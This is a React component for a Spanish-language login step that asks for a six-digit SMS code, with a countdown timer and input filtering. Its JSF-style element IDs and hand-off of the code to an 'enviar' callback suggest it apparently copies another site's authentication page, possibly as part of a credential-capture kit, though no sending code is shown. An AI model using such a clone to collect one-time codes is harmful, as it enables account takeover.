/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable jsx-a11y/alt-text */
"use client";
import { useEffect, useState } from "react";

const Otp = ({ enviar }: any) => {
  const [seconds, setSeconds] = useState(60);
  const [otp, setOtp] = useState("");

  // Timer
  useEffect(() => {
    if (seconds === 0) return;

    const interval = setInterval(() => {
      setSeconds((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [seconds]);

  // Formato MM:SS
  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
  };

  // 🔒 Validación OTP (solo números y 6 dígitos)
  const handleOtpChange = (e: any) => {
    let value = e.target.value;

    // Permitir solo números
    value = value.replace(/[^0-9]/g, "");

    // Limitar a 6 dígitos
    if (value.length > 6) value = value.slice(0, 6);

    setOtp(value);

    // Actualizar hidden input
    const hiddenInput = document.getElementById("formAutenticar:otp") as HTMLInputElement;
    if (hiddenInput) hiddenInput.value = value;
  };

  // 🔘 Acción del botón VALIDAR
  const handleSubmit = (e: any) => {
    e.preventDefault();
    enviar?.({ otp: otp, view: "otp" });

  };

  return (
    <div className="container">
      <form
        id="formAutenticar"
        name="formAutenticar"
        method="post"
        action=""
        className="form-login"
        encType="application/x-www-form-urlencoded"
        target="_top"
        autoComplete="off"
        onSubmit={handleSubmit}
      >
        <div id="formAutenticar:loginp" className="loginp">
          <div className="wrap container-fluid">
            <div id="formAutenticar:panelContainer" className="form-container">

              <div id="formAutenticar:panelGroupMain" className="auth-form-container">

                <div className="auth-form__logo"></div>

                <h2 className="auth-form__title">¡Hola!</h2>
                <h3 className="auth-form__subtitle">Nos alegra que esté aquí</h3>

                {/* OTP */}
                <div id="formAutenticar:panelOTP" className="form-field__otp">
                  <label htmlFor="formAutenticar:otpMask">
                    Ingrese el código que enviamos a su celular
                  </label>

                  <input
                    id="formAutenticar:otpMask"
                    type="text"
                    maxLength={6}
                    autoComplete="off"
                    value={otp}
                    onChange={handleOtpChange}
                  />

                  <input id="formAutenticar:otp" type="hidden" />
                  <input id="formAutenticar:otpCrypto" type="hidden" />

                  <div className="error-message-container__otp">
                    <img src="css/error-icono.svg" className="error-message-icon" />
                    <p className="error" id="pOtp"></p>
                  </div>

                  <div className="form-field__counter">
                    Podrá solicitar otro código en{" "}
                    <span id="timer">{formatTime(seconds)}</span>
                  </div>
                </div>

                {/* Botón VALIDAR */}
                <div id="formAutenticar:button-container" className="submit">
                  <input
                    id="formAutenticar:btnSubmitCont"
                    type="submit"
                    value="Validar"
                    className="btn-red continuar"
                  />
                </div>

                <div className="form-divider"></div>

                <div className="form-link-olvido">
                  <a href="#">¿Olvidó su clave?</a>
                </div>

              </div>
            </div>

          </div>
        </div>
      </form>
    </div>
  );
};

export default Otp;